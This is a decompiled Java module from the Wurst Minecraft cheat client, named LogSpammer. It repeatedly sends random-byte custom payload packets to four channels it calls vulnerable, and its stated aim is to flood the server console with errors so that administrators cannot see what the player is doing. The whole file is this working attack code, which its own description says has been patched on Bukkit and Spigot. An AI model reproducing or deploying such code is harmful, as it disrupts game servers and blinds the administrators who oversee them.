// 
// Decompiled by Procyon v0.6.0
// 

package net.wurstclient.features.mods.other;

import net.minecraft.network.Packet;
import net.wurstclient.compatibility.WConnection;
import net.minecraft.network.play.client.CPacketCustomPayload;
import io.netty.buffer.Unpooled;
import net.wurstclient.Category;
import java.util.Random;
import net.minecraft.network.PacketBuffer;
import net.wurstclient.features.Bypasses;
import net.wurstclient.events.UpdateListener;
import net.wurstclient.features.Hack;

@Bypasses(ghostMode = false, latestNCP = false, olderNCP = false)
public final class LogSpammerMod extends Hack implements UpdateListener
{
    private PacketBuffer payload;
    private Random random;
    private final String[] vulnerableChannels;
    
    public LogSpammerMod() {
        super("LogSpammer", "Fills the server console with errors so that admins can't see what you are doing.\nPatched on Bukkit and Spigot servers. They will kick you if you use it.");
        this.vulnerableChannels = new String[] { "MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem" };
        this.setCategory(Category.OTHER);
    }
    
    @Override
    public void onEnable() {
        this.random = new Random();
        this.payload = new PacketBuffer(Unpooled.buffer());
        final byte[] rawPayload = new byte[this.random.nextInt(128)];
        this.random.nextBytes(rawPayload);
        this.payload.writeBytes(rawPayload);
        LogSpammerMod.EVENTS.add(UpdateListener.class, this);
    }
    
    @Override
    public void onDisable() {
        LogSpammerMod.EVENTS.remove(UpdateListener.class, this);
    }
    
    @Override
    public void onUpdate() {
        this.updateMS();
        if (this.hasTimePassedM(100L)) {
            WConnection.sendPacket(new CPacketCustomPayload(this.vulnerableChannels[this.random.nextInt(this.vulnerableChannels.length)], this.payload));
            this.updateLastMS();
        }
    }
}
